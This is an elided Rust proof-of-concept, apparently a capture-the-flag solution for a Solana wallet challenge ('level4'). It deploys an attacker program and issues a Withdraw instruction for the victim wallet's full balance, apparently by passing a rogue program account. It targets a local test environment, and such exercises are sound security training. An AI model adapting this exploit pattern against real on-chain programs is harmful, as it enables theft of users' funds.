...
fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
    let (hacker_wallet_address, _bump) = level4::get_wallet_address(&challenge.hacker.pubkey(), &challenge.wallet_program);
    let (hacker_authority_address, _bump) = level4::get_authority(&challenge.wallet_program);
    let hack_program = env.deploy_program("target/deploy/level4_poc_contract.so");

    let amount = env.get_account(challenge.wallet_address).unwrap().lamports;
    
    assert_tx_success(env.execute_as_transaction(&[level4::initialize(
    ...
    env.execute_as_transaction(&[
        Instruction {
            ...
            accounts: vec![
                ...
                AccountMeta::new_readonly(hacker_authority_address, false),
                AccountMeta::new_readonly(challenge.hacker.pubkey(), true),
                AccountMeta::new(challenge.wallet_address, false),
                AccountMeta::new_readonly(spl_token::ID, false),
                AccountMeta::new_readonly(hack_program, false),
            ],
            data: level4::WalletInstruction::Withdraw { amount }.try_to_vec().unwrap(),
        }
    ], &[&challenge.hacker]);
}
